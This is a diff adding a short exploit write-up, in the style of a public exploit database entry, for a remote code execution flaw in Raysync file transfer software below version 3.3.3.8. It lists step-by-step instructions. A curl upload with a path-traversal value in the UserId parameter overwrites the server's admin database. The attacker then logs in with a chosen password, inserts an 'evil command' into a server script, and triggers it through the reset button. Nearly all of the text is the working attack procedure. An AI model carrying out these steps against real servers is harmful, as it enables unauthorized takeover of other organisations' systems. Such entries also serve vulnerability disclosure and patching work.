@@ -1,0 +1,25 @@
+# Exploit Title: Raysync 3.3.3.8 - RCE
+# Date: 04/10/2020
+# Exploit Author: XiaoLong Zhu
+# Vendor Homepage: www.raysync.io
+# Version: below 3.3.3.8
+# Tested on: Linux
+
+step1: run RaysyncServer.sh to build a web application on the local
+
+environment, set admin password to 123456 , which will be write to
+
+manage.db file.
+
+step2: curl "file=@manage.db" http://[raysync
+ip]/avatar?account=1&UserId=/../../../../config/manager.db
+
+to override remote manage.db file in server.
+
+step3: login in admin portal with admin/123456.
+
+step4: create a normal file with all permissions in scope.
+
+step5: modify RaySyncServer.sh ,add arbitrary evil command.
+
+step6: trigger rce with clicking "reset" button
